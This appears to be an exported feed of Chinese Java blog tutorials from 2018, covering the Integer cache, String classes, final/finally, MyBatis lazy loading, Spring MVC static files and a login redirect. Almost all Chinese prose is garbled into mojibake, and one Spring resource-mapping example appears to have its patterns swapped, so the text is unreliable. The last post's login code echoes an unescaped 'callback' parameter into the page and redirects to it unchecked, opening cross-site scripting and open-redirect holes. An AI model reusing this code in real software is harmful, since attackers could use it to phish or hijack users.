i)<br>ÔºåÂÖ∂‰∏≠Â∞±‰ºöÂà§Êñ≠ËØ•Êï∞ÂÄºÊòØÂê¶ÊòØÂú®ÁºìÂ≠òÂÄºËåÉÂõ¥ÂÜÖÔºåÂ¶ÇÊûúÊòØÔºåÂàôËøîÂõû‰∏Ä‰∏™Â∑≤ÁªèÂàõÂª∫Â•ΩÁöÑIntgerÂØπË±°Ôºå‰πüÂ∞±ÊòØÂú®IntegerCache‰∏≠ÂàõÂª∫ÁöÑIntegerÁºìÂ≠òÊï∞ÁªÑÔºåÂ¶ÇÊûú‰∏çÂú®Ëøô‰∏™ËåÉÂõ¥ÂÜÖÔºåÂ∞±Áõ¥Êé•new<br>‰∏Ä‰∏™Integer„ÄÇ<br>ÂΩìÁÑ∂ÔºåËøô‰∏™ÁºìÂ≠òÂÄºÈªòËÆ§ÊòØ-128~127 Ôºå‰ΩÜÊòØÊòØÂèØ‰ª•‰øÆÊîπÁöÑÔºåÂú®vm‰∏≠‰øÆÊîπÂç≥ÂèØË∞ÉÊï¥ÁºìÂ≠òÂ§ßÂ∞è„ÄÇ</p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> Èù¢ËØïÈ¢ò </tag>
            
            <tag> Èù¢ËØï </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stringÔºåstringBufferÔºåstringBuilderÂå∫Âà´</title>
      <link href="/2018/07/12/string%EF%BC%8CstringBuffer%EF%BC%8CstringBuilder%E5%8C%BA%E5%88%AB/"/>
      <url>/2018/07/12/string%EF%BC%8CstringBuffer%EF%BC%8CstringBuilder%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<ol><li>string </li></ol><pre><code>public final class String    implements java.io.Serializable, Comparable&lt;String&gt;, CharSequence {    /** The value is used for character storage. */    private final char value[];</code></pre><p>‰ªéËøôÈáåÂèØ‰ª•ÁúãÂá∫ÔºåstringÊòØÊòéÊòæÁöÑimmutableÁ±ªÔºåË¢´‰øÆÈ•∞‰∏∫final<br>classÔºåËÄå‰∏îÊñπÊ≥ïÈÉΩË¢´final‰øÆÈ•∞ÔºåÊâÄ‰ª•ÊãºÊé•ÔºåÂâ™Ë£ÅÁ≠âÊñπÊ≥ïÈÉΩnewÊñ∞ÁöÑstring„ÄÇ<br>‰∏∫‰∫ÜÈÅøÂÖçÂ§ßÈáèÁöÑstringË¢´ÂàõÂª∫ÔºåÂÖ∂ËøêË°åÊú∫Âà∂ÊòØÔºöÂàõÂª∫‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤Êó∂ÔºåÈ¶ñÂÖàÊ£ÄÊü•Ê±†‰∏≠ÊòØÂê¶ÊúâÂÄºÁõ∏ÂêåÁöÑÂ≠óÁ¨¶‰∏≤ÂØπË±°ÔºåÂ¶ÇÊûúÊúâÂàô‰∏çÈúÄË¶ÅÂàõÂª∫Áõ¥Êé•‰ªéÊ±†‰∏≠ÂàöÊü•ÊâæÂà∞ÁöÑÂØπË±°ÂºïÁî®ÔºõÂ¶ÇÊûúÊ≤°ÊúâÂàôÊñ∞Âª∫Â≠óÁ¨¶‰∏≤ÂØπË±°ÔºåËøîÂõûÂØπË±°ÂºïÁî®ÔºåÂπ∂‰∏îÂ∞ÜÊñ∞ÂàõÂª∫ÁöÑÂØπË±°ÊîæÂÖ•Ê±†‰∏≠„ÄÇ‰ΩÜÊòØÔºåÈÄöËøánewÊñπÊ≥ïÂàõÂª∫ÁöÑStringÂØπË±°ÊòØ‰∏çÊ£ÄÊü•Â≠óÁ¨¶‰∏≤Ê±†ÁöÑÔºåËÄåÊòØÁõ¥Êé•Âú®Â†ÜÂå∫ÊàñÊ†àÂå∫ÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑÂØπË±°Ôºå‰πü‰∏ç‰ºöÊääÂØπË±°ÊîæÂÖ•Ê±†‰∏≠„ÄÇ‰∏äËø∞ÂéüÂàôÂè™ÈÄÇÁî®‰∫éÈÄöËøáÁõ¥Êé•ÈáèÁªôStringÂØπË±°ÂºïÁî®ËµãÂÄºÁöÑÊÉÖÂÜµ„ÄÇ</p><p>‰∏æ‰æãÔºöString str1 = ‚Äú123‚Äù; //ÈÄöËøáÁõ¥Êé•ÈáèËµãÂÄºÊñπÂºèÔºåÊîæÂÖ•Â≠óÁ¨¶‰∏≤Â∏∏ÈáèÊ±†<br>String str2 = new String(‚Äú123‚Äù);//ÈÄöËøánewÊñπÂºèËµãÂÄºÊñπÂºèÔºå‰∏çÊîæÂÖ•Â≠óÁ¨¶‰∏≤Â∏∏ÈáèÊ±†</p><p>Ê≥®ÊÑèÔºöStringÊèê‰æõ‰∫Üintern()ÊñπÊ≥ï„ÄÇË∞ÉÁî®ËØ•ÊñπÊ≥ïÊó∂ÔºåÂ¶ÇÊûúÂ∏∏ÈáèÊ±†‰∏≠ÂåÖÊã¨‰∫Ü‰∏Ä‰∏™Á≠â‰∫éÊ≠§StringÂØπË±°ÁöÑÂ≠óÁ¨¶‰∏≤ÔºàÁî±equalsÊñπÊ≥ïÁ°ÆÂÆöÔºâÔºåÂàôËøîÂõûÊ±†‰∏≠ÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇÂê¶ÂàôÔºåÂ∞ÜÊ≠§StringÂØπË±°Ê∑ªÂä†Âà∞Ê±†‰∏≠ÔºåÂπ∂‰∏îËøîÂõûÊ≠§Ê±†‰∏≠ÂØπË±°ÁöÑÂºïÁî®„ÄÇ</p><p>2.stringBuffer<br>3.stringBuilder<br>stringBufferÂíåstringBuilderÈÉΩÁªßÊâø‰∫ÜAbstractStringBuilderÔºåÊèê‰æõ‰∫ÜÂá†‰πé‰∏ÄÊ†∑ÊñπÊ≥ï„ÄÇ</p><pre><code>abstract class AbstractStringBuilder implements Appendable, CharSequence {    /**     * The value is used for character storage.     */    char[] value;</code></pre><p>ÂèØ‰ª•ÁúãÂá∫Ëøô‰∏™Âú∞ÊñπÔºå‰∏çÊòØÁî®final‰øÆÈ•∞ÁöÑÔºåÊâÄ‰ª•Ê∑ªÂä†ÔºåÁ≠âÊñπÊ≥ïÊó∂‰∏ç‰ºönew ÂØπË±°„ÄÇ</p><p>‰ΩÜÊòØÔºåstringBufferÂíåStringBuilderÊòØÊúâ‰∏çÂêåÁöÑÔºåStringBufferÊâÄÊúâÊñπÊ≥ïÈÉΩÊòØË¢´synchronized‰øÆÈ•∞ÁöÑ</p><pre><code>@Overridepublic synchronized int length() {    return count;}@Overridepublic synchronized int capacity() {    return value.length;}@Overridepublic synchronized void ensureCapacity(int minimumCapacity) {    super.ensureCapacity(minimumCapacity);}</code></pre><p>‰πüÂ∞±ÊòØËØ¥stringBufferÊòØÁ∫øÁ®ãÂÆâÂÖ®ÁöÑÔºå‰ΩÜÂÆâÂÖ®ÁöÑ‰ª£‰ª∑ÊòØÔºåÊÄßËÉΩÁöÑÈôç‰Ωé„ÄÇ</p>]]></content>
      
      
      
        <tags>
            
            <tag> Èù¢ËØïÈ¢ò </tag>
            
            <tag> javaÈù¢ËØï </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>finalÂíåfinallyÂíåfinalize‰πãÈó¥Âå∫Âà´</title>
      <link href="/2018/07/10/final%E5%92%8Cfinally%E5%92%8Cfinalize%E4%B9%8B%E9%97%B4%E5%8C%BA%E5%88%AB/"/>
      <url>/2018/07/10/final%E5%92%8Cfinally%E5%92%8Cfinalize%E4%B9%8B%E9%97%B4%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<p>finalÔºö<br>ÂèØ‰ª•Áî®Êù•‰øÆÈ•∞Á±ªÔºåÂèòÈáèÔºåÊñπÊ≥ï<br>finalÁ±ªÔºö‰∏çÂèØÁªßÊâøÊâ©Â±ï<br>finalÂèòÈáèÔºö‰∏çÂèØÊõ¥Êîπ<br>finalÊñπÊ≥ïÔºö‰∏çÂèØoverride</p><p>finallyÔºöÊòØjava‰∏≠‰øùËØÅÈáçÁÇπ‰ª£Á†Å‰∏ÄÂÆöË¢´ÊâßË°åÁöÑÊú∫Âà∂ÔºåÊúâtry-catch-finallyÂíåtry-finally<br>Êù•ÂÖ≥Èó≠jdbcËøûÊé•Ôºå‰øùËØÅunlockÁ≠âÂä®‰Ωú</p><pre><code>try {// do something  System.exit(1); } finally{   System.out.println(‚ÄúPrint from finally‚Äù);  }</code></pre><p>‰ΩÜÊòØ‰∏äÈù¢Ëøô‰∏™‰ª£Á†ÅÊòØ‰∏çÊâßË°åÁöÑÔºåfinallyÂõ†‰∏∫Âú®ÂâçÈù¢ÔºåË∞ÉÁî®‰∫Üsystem.exit(1);<br>Â∞ÜÁ®ãÂ∫èÈÄÄÂá∫‰∫ÜÔºåfinallyÊó†Ê≥ïÊâßË°å</p><p>finalizeÊòØjava.lang.Object‰∏≠ÁöÑ‰∏Ä‰∏™ÊñπÊ≥ïÔºåÂÆÉÊòØÂú®ÂûÉÂúæÂõûÊî∂ÂâçÔºåÊèêÂâçÂØπÁâπÂÆöÂØπË±°ËøõË°åÂõûÊî∂Ôºå‰ΩÜÊòØÁé∞Âú®Â∑≤Áªè‰∏çÊé®Ëçê‰ΩøÁî®‰∫Ü„ÄÇ</p>]]></content>
      
      
      
        <tags>
            
            <tag> Èù¢ËØïÈ¢ò </tag>
            
            <tag> javaÂ§ç‰π† </tag>
            
            <tag> javaÊ†∏ÂøÉÊäÄÊúØ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>exceptionÂíåerrorÂå∫Âà´</title>
      <link href="/2018/07/10/exception%E5%92%8Cerror%E5%8C%BA%E5%88%AB/"/>
      <url>/2018/07/10/exception%E5%92%8Cerror%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<p>exceptionÂíåerrorÈÉΩÊòØÁªßÊâøthrowableÁ±ªÔºåÂú®java‰∏≠Âè™ÊúâthrowableÁ±ªÂûãÂèØ‰ª•Ë¢´throwÊàñËÄÖË¢´catchÔºåÂÆÉÊòØÂºÇÂ∏∏Â§ÑÁêÜÊú∫Âà∂ÁöÑÂü∫Êú¨ÁªÑÊàêÁ±ªÂûã<br>errorÊòØÊåáÊ≠£Â∏∏ÊÉÖÂÜµ‰∏ãÔºå‰∏çÂ§ßÂèØËÉΩÂá∫Áé∞ÁöÑÔºåÁªùÂ§ßÂ§öÊï∞errorÈÉΩ‰ºöÂØºËá¥Á®ãÂ∫èÔºàÊØîÂ¶ÇjvmËá™Ë∫´ÔºâÂ§Ñ‰∫éÈùûÊ≠£Â∏∏ÊàñËÄÖ‰∏çÂèØÊÅ¢Â§çÁöÑÁä∂ÊÄÅ„ÄÇÊØîÂ¶ÇËØ¥OutOfmemoryError<br>exceptionÂàÜ‰∏∫ÂèØÊ£ÄÊü•ÔºàcheckedÔºâÂíå‰∏çÂèØÊ£ÄÊü•ÔºàuncheckedÔºâ<br>checkedÂú®Á®ãÂ∫è‰∏≠ÂøÖÈ°ªËøõË°åÊçïËé∑Â§ÑÁêÜÔºåË≠¨Â¶ÇIOException<br>uncheckedÊòØËøêË°åÊó∂ÂºÇÂ∏∏ÔºåË≠¨Â¶ÇËØ¥RuntimeExceptionÂíåNullPointerException</p>]]></content>
      
      
      
        <tags>
            
            <tag> Èù¢ËØïÈ¢ò </tag>
            
            <tag> javaÂ§ç‰π† </tag>
            
            <tag> javaÊ†∏ÂøÉÊäÄÊúØ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java.lang.ClassNotFoundException_ org.apache.jsp.WEB_002dINF.jsp.login_jsp</title>
      <link href="/2018/06/20/java.lang.ClassNotFoundException_%20org.apache.jsp.WEB_002dINF.jsp.login_jsp/"/>
      <url>/2018/06/20/java.lang.ClassNotFoundException_%20org.apache.jsp.WEB_002dINF.jsp.login_jsp/</url>
      
        <content type="html"><![CDATA[<p>springboot È°πÁõÆ‰∏≠ÔºåÂá∫Áé∞Ëøô‰∏™ÈîôËØØÔºåÊü•ÁúãÊòØÂê¶pom.xmlÈáåÈù¢ÁöÑdenpendencyÊòØÂê¶ÈÉΩÂ∑≤Áªè‰∏ãËΩΩÊàêÂäüÔºåÂ¶ÇÊûú‰∏çÊòØÔºå‰Ω†ÁúãÁúãÂà´‰∫∫ÁöÑÂçöÂÆ¢</p>]]></content>
      
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mybatis lazyload</title>
      <link href="/2018/06/15/mybatis%20lazyload/"/>
      <url>/2018/06/15/mybatis%20lazyload/</url>
      
        <content type="html"><![CDATA[<p>È¶ñÂÖàpojoÁ±ª<br>dept.java</p><pre><code>package com.husky.pojo;import java.util.List;public class Dept {    private int id;    private String name;    private List&lt;Emp&gt; emps;    public int getId() {        return id;    }    public void setId(int id) {        this.id = id;    }    public String getName() {        return name;    }    public void setName(String name) {        this.name = name;    }    public List&lt;Emp&gt; getEmps() {        return emps;    }    public void setEmp(List&lt;Emp&gt; emps) {        this.emps = emps;    }    @Override    public String toString() {        return &quot;Dept{&quot; +                &quot;id=&quot; + id +                &quot;, name=&apos;&quot; + name + &apos;\&apos;&apos; +                &quot;, emps=&quot; + emps +                &apos;}&apos;;    }}</code></pre><p>emp.java</p><pre><code>package com.husky.pojo;public class Emp {    private int id;    private String firstName;    private double salary;    private Emp manager;    public int getId() {        return id;    }    public void setId(int id) {        this.id = id;    }    public String getFirstName() {        return firstName;    }    public void setFirstName(String firstName) {        this.firstName = firstName;    }    public double getSalary() {        return salary;    }    public void setSalary(double salary) {        this.salary = salary;    }    public Emp getManager() {        return manager;    }    public void setManager(Emp manager) {        this.manager = manager;    }    @Override    public String toString() {        return &quot;Emp{&quot; +                &quot;id=&quot; + id +                &quot;, firstName=&apos;&quot; + firstName + &apos;\&apos;&apos; +                &quot;, salary=&quot; + salary +                &quot;, manager=&quot; + manager +                &apos;}&apos;;    }}</code></pre><p>‰∏ãÈù¢ÊòØEmpMapper.xml</p><pre><code>&lt;!--namespace=&quot;emp&quot;--&gt;&lt;select id=&quot;findByDept&quot; parameterType=&quot;int&quot; resultType=&quot;com.husky.pojo.Emp&quot;&gt;        select id,first_name name,salary from s_emp where dept_id = #{id}    &lt;/select&gt;</code></pre><p>DeptMapper.xml</p><pre><code>&lt;!--lazy load--&gt;&lt;resultMap id=&quot;lazyDept&quot; type=&quot;com.husky.pojo.Dept&quot;&gt;    &lt;id column=&quot;id&quot; property=&quot;id&quot;/&gt;    &lt;!--        ÂØπdept‰∏≠ÁöÑemp‰ø°ÊÅØÂª∂ËøüÂä†ËΩΩ        Âú®collection‰∏≠ÁöÑ        select :Ë°®Á§∫ÂÖ≥ËÅîÁöÑÊü•ËØ¢ÔºåÊ≠§Â§ÑÂ¶ÇÊûúÁöÑfindByDept‰∏çÊòØDeptMapper.xml‰∏≠ÔºåÂàôË¶ÅÂä†Âè¶‰∏Ä‰∏™mapperÁöÑnamespaceÔºåÂ¶Çemp.findByDept        column:ÊòØÂè¶Â§ñ‰∏Ä‰∏™Êü•ËØ¢ÊâÄÈúÄË¶ÅÁöÑÂèÇÊï∞    --&gt;    &lt;collection property=&quot;emps&quot; ofType=&quot;com.husky.pojo.Emp&quot;                select=&quot;emp.findByDept&quot; column=&quot;id&quot;&gt;&lt;/collection&gt;&lt;/resultMap&gt;&lt;select id=&quot;findDeptById&quot; parameterType=&quot;int&quot; resultMap=&quot;lazyDept&quot;&gt;    select id,name from s_dept where id = #{id}&lt;/select&gt;</code></pre><p>ÂΩìÁÑ∂Ë¶ÅÂºÄÂêØÊáíÂä†ËΩΩË¶ÅÂú®mybatis ÈÖçÁΩÆÊñá‰ª∂‰∏≠Âä†‰∏älazyloadÁöÑÈÖçÁΩÆ<br>sqlMapConfig.xml</p><pre><code>&lt;settings&gt;        &lt;!-- Globally enables or disables any caches configured in any mapper under this configuration --&gt;        &lt;setting name=&quot;cacheEnabled&quot; value=&quot;true&quot;/&gt;        &lt;!-- Sets the number of seconds the driver will wait for a response from the database --&gt;        &lt;setting name=&quot;defaultStatementTimeout&quot; value=&quot;3000&quot;/&gt;        &lt;!-- Enables automatic mapping from classic database column names A_COLUMN to camel case classic Java property names aColumn --&gt;        &lt;setting name=&quot;mapUnderscoreToCamelCase&quot; value=&quot;true&quot;/&gt;        &lt;!-- Allows JDBC support for generated keys. A compatible driver is required.        This setting forces generated keys to be used if set to true,         as some drivers deny compatibility but still work --&gt;        &lt;setting name=&quot;useGeneratedKeys&quot; value=&quot;true&quot;/&gt;        &lt;!--ÂºÄÂêØÊáíÂä†ËΩΩ--&gt;        &lt;setting name=&quot;lazyLoadingEnabled&quot; value=&quot;true&quot;/&gt;        &lt;!--ÂÖ≥Èó≠ÊáíÂä†ËΩΩÁöÑÂØπË±°ÂèØËÉΩË¢´‰ªª‰ΩïÊáíÂ±ûÊÄßÂÖ®ÈÉ®Âä†ËΩΩ--&gt;        &lt;setting name=&quot;aggressiveLazyLoading&quot; value=&quot;false&quot;/&gt;        &lt;!--Ê∂àÈô§equalsÔºåhashcodeÔºåtoStringÁ≠âÊñπÊ≥ïÂØπÊáíÂä†ËΩΩÁöÑÂΩ±Âìç--&gt;        &lt;setting name=&quot;lazyLoadTriggerMethods&quot; value=&quot;&quot;/&gt;    &lt;/settings&gt;</code></pre><p>ÊµãËØï</p><pre><code>package com.husky.test;import com.husky.pojo.Dept;import com.husky.pojo.Emp;import com.husky.pojo.Region;import org.apache.ibatis.io.Resources;import org.apache.ibatis.session.SqlSession;import org.apache.ibatis.session.SqlSessionFactory;import org.apache.ibatis.session.SqlSessionFactoryBuilder;import org.junit.Before;import java.io.IOException;import java.io.InputStream;public class Test {    SqlSessionFactory factory;    @Before    public void before() throws IOException {        String res = &quot;com/husky/sqlMapConfig.xml&quot;;        InputStream is = Resources.getResourceAsStream(res);        factory = new SqlSessionFactoryBuilder().build(is);    }    @org.junit.Test    public void lazyTest(){        SqlSession session = factory.openSession();        Dept d = session.selectOne(&quot;findDeptById&quot;,42);        System.out.println(d);        System.out.println(d.getEmps());    }}</code></pre><p>ËæìÂá∫ÁªìÊûú</p><pre><code>Dept{id=42, name=&apos;Operations&apos;, emps=null}[Emp{id=7, firstName=&apos;null&apos;, salary=1250.0, manager=null}, Emp{id=18, firstName=&apos;null&apos;, salary=1200.0, manager=null}, Emp{id=19, firstName=&apos;null&apos;, salary=795.0, manager=null}]</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> mybatis </tag>
            
            <tag> lazyload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springmvc ÈùôÊÄÅÊñá‰ª∂Êó†Ê≥ïËÆøÈóÆ  js css img</title>
      <link href="/2018/06/14/springmvc%20%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%20%20js%20css%20img/"/>
      <url>/2018/06/14/springmvc%20%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%20%20js%20css%20img/</url>
      
        <content type="html"><![CDATA[<p>web.xmlÈáåÈù¢ÈÖçÁΩÆÁöÑdispatchservlet</p><pre><code>&lt;servlet&gt;        &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt;        &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;        &lt;init-param&gt;            &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;            &lt;param-value&gt;classpath:spring.xml&lt;/param-value&gt;        &lt;/init-param&gt;    &lt;/servlet&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt;        &lt;url-pattern&gt;/&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;</code></pre><p>Âú®jsp‰∏≠Ë∞ÉÁî®jquery.jsÁöÑÊó∂ÂÄôÔºåÊµèËßàÂô®consoleÊèêÁ§∫Ôºåjquery.js 404 ,Êâæ‰∏çÂà∞</p><pre><code>url-patternÊúâ5ÁßçÈÖçÁΩÆÊ®°ÂºèÔºö  Ôºà1Ôºâ/xxx:ÂÆåÂÖ®ÂåπÈÖç/xxxÁöÑË∑ØÂæÑ  Ôºà2Ôºâ/xxx/*:ÂåπÈÖç‰ª•/xxxÂºÄÂ§¥ÁöÑË∑ØÂæÑÔºåËØ∑Ê±Ç‰∏≠ÂøÖÈ°ªÂåÖÂê´xxx„ÄÇ  Ôºà3Ôºâ/*ÔºöÂåπÈÖç/‰∏ãÁöÑÊâÄÊúâË∑ØÂæÑ,ËØ∑Ê±ÇÂèØ‰ª•ËøõÂÖ•Âà∞actionÊàñcontrollerÔºå‰ΩÜÊòØËΩ¨ÂèëjspÊó∂ÂÜçÊ¨°Ë¢´Êã¶Êà™Ôºå‰∏çËÉΩËÆøÈóÆjspÁïåÈù¢„ÄÇ  Ôºà4Ôºâ.xx:ÂåπÈÖç‰ª•xxÁªìÂ∞æÁöÑË∑ØÂæÑÔºåÊâÄÊúâËØ∑Ê±ÇÂøÖÈ°ª‰ª•.xxÁªìÂ∞æÔºå‰ΩÜ‰∏ç‰ºöÂΩ±ÂìçËÆøÈóÆÈùôÊÄÅÊñá‰ª∂„ÄÇ  Ôºà5Ôºâ/:ÈªòËÆ§Ê®°ÂºèÔºåÊú™Ë¢´ÂåπÈÖçÁöÑË∑ØÂæÑÈÉΩÂ∞ÜÊò†Â∞ÑÂà∞Âà∫servletÔºåÂØπjpgÔºåjsÔºåcssÁ≠âÈùôÊÄÅÊñá‰ª∂‰πüÂ∞ÜË¢´Êã¶Êà™Ôºå‰∏çËÉΩËÆøÈóÆ„ÄÇ </code></pre><p>ÂèØ‰ª•Áî®‰ª•‰∏ãÊñπÂºèËß£ÂÜ≥Ôºö<br>1.Âú®spring-mvc.xmlÈáåÈù¢ÈÖçÁΩÆ</p><pre><code>&lt;mvc:resources mapping=&quot;/js/&quot; location=&quot;/js/**&quot;/&gt;    &lt;mvc:resources mapping=&quot;/css/&quot; location=&quot;/css/**&quot;/&gt;    &lt;mvc:resources mapping=&quot;/img/&quot; location=&quot;/img/**&quot;/&gt;</code></pre><p>2.Âú®web.xmlÈáåÈù¢ÈÖçÁΩÆ</p><pre><code>&lt;servlet-mapping&gt;    &lt;servlet-name&gt;default&lt;/servlet-name&gt;    &lt;url-pattern&gt;/js/*&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;</code></pre><p>Ê≠§Â§ÑÁöÑdefault<br>È¶ñÂÖàÊâÄÊúâÁöÑËØ∑Ê±ÇËøõÂÖ•tomcatÔºåÈÉΩ‰ºöÊµÅÁªèservletÔºåÂ¶ÇÊûúÊ≤°ÊúâÂåπÈÖçÂà∞‰ªª‰ΩïÂ∫îÁî®ÊåáÂÆöÁöÑservletÔºåÈÇ£‰πàÂ∞±‰ºöÊµÅÂà∞ÈªòËÆ§ÁöÑservlet„ÄÇ</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>idea maven spring javaÊôÆÈÄöÈ°πÁõÆ</title>
      <link href="/2018/06/05/idea%20maven%20spring%20java%E6%99%AE%E9%80%9A%E9%A1%B9%E7%9B%AE/"/>
      <url>/2018/06/05/idea%20maven%20spring%20java%E6%99%AE%E9%80%9A%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<p><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373883.12032968510.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"><br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373883.8599896841.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"><br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373884.04294877432.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"><br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373884.29795156285.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"><br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373884.49624566447.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"><br>ÈÖçÁΩÆpom.xml<br>‰∏ãÈù¢Âú®pom.xmlÈáåÈù¢Ê∑ªÂä†</p><pre><code>&lt;dependency&gt;          &lt;groupId&gt;org.springframework&lt;/groupId&gt;          &lt;artifactId&gt;spring-context&lt;/artifactId&gt;          &lt;version&gt;4.3.16.RELEASE&lt;/version&gt;      &lt;/dependency&gt;</code></pre><p>ÂÖ∑‰ΩìÁöÑÔºåÂèØ‰ª•Âéª <a href="http://mvnrepository.com/artifact/org.springframework/spring-context" target="_blank" rel="noopener"> http://mvnrepository.com/artifact/org.springframework/spring-context</a><br>Ëá™Â∑±ÈÄâÊã©Ôºå‰Ω†ÈúÄË¶ÅÁöÑÁâàÊú¨<br>pomÂÜôÂ•ΩÂêéÔºåreimport‰∏Ä‰∏ã<br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373885.02579986241.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"></p><p>Âú®srcÊñá‰ª∂Â§π‰∏ãÊñ∞Âª∫‰∏Ä‰∏™resourcesÊñá‰ª∂Â§πÔºåÂ∞Ü‰ªñÊîπ‰∏∫Resources root<br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373885.26300862733.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"></p><p>Âú®ÈáåÈù¢Êñ∞Âª∫spring-config.xml</p><p><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373885.6259611958.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"><br>ÁÆÄÂçïÊµãËØï‰∏Ä‰∏ãÔºå<br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373885.886376915.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"><br>ÊàêÂäü</p>]]></content>
      
      
      
        <tags>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÁÇπÂáªÁôªÂΩïÂêéË∑≥ËΩ¨ÂõûÂéüÊù•ÁïåÈù¢</title>
      <link href="/2018/06/04/%E7%82%B9%E5%87%BB%E7%99%BB%E5%BD%95%E5%90%8E%E8%B7%B3%E8%BD%AC%E5%9B%9E%E5%8E%9F%E6%9D%A5%E7%95%8C%E9%9D%A2/"/>
      <url>/2018/06/04/%E7%82%B9%E5%87%BB%E7%99%BB%E5%BD%95%E5%90%8E%E8%B7%B3%E8%BD%AC%E5%9B%9E%E5%8E%9F%E6%9D%A5%E7%95%8C%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<ol><li>ÂÖ∑‰ΩìÊÄùÊÉ≥ÔºåÂú®ÁÇπÂáªÁôªÂΩïÊòØÊó∂ÂÄôÔºåÂ∞ÜÂΩìÂâçÁïåÈù¢ÁöÑÂú∞ÂùÄcallbackÈÄöËøágetÊñπÂºè‰º†Âà∞loginÁïåÈù¢ÔºåloginÁïåÈù¢ÂÜçÈÄöËøáÊñπÂºè‰º†ÈÄíËøáÂéª </li></ol><hr><p>some.jsp</p><pre><code>&lt;%@ page import=&quot;java.util.List&quot; %&gt;&lt;%@ page import=&quot;java.util.Collection&quot; %&gt;&lt;%--  Created by IntelliJ IDEA.  User: Administrator  Date: 2018/6/4 0004  Time: ‰∏äÂçà 11:12  To change this template use File | Settings | File Templates.--%&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt;  &lt;head&gt;    &lt;title&gt;$Title$&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;  &lt;a id=&quot;logina&quot; href=&quot;login.jsp?callback=&quot;&gt;login&lt;/a&gt;  &lt;/body&gt;&lt;script type=&quot;text/javascript&quot;&gt;    var a = document.getElementById(&quot;logina&quot;);        console.log(a);        a.href+=window.location.href;&lt;/script&gt;&lt;/html&gt;</code></pre><p>login.jsp</p><pre><code>&lt;%--  Created by IntelliJ IDEA.  User: Administrator  Date: 2018/6/4 0004  Time: ‰∏ãÂçà 1:04  To change this template use File | Settings | File Templates.--%&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;login&quot;&gt;    &lt;input type=&quot;text&quot; name=&quot;name&quot;/&gt;    &lt;input type=&quot;password&quot; name=&quot;password&quot;/&gt;    &lt;input type=&quot;hidden&quot; name=&quot;callback&quot; value=&quot;&lt;%=request.getParameter(&quot;callback&quot;)%&gt;&quot;/&gt;    &lt;input type=&quot;submit&quot; value=&quot;login&quot;/&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>controller</p><pre><code>package controller;import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;@WebServlet(name = &quot;LoginServlet&quot;,urlPatterns = {&quot;/login&quot;})public class LoginServlet extends HttpServlet {    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {        request.setCharacterEncoding(&quot;utf-8&quot;);        /**         * ÁúÅÁï•ÂØπÁî®Êà∑ÂêçÂíåÂØÜÁ†ÅÁöÑÊìç‰ΩúÔºåÂíåÊï∞ÊçÆÂ∫ìÂåπÈÖç         *         * */        String callback = request.getParameter(&quot;callback&quot;);        response.sendRedirect(callback);    }    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {    }}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
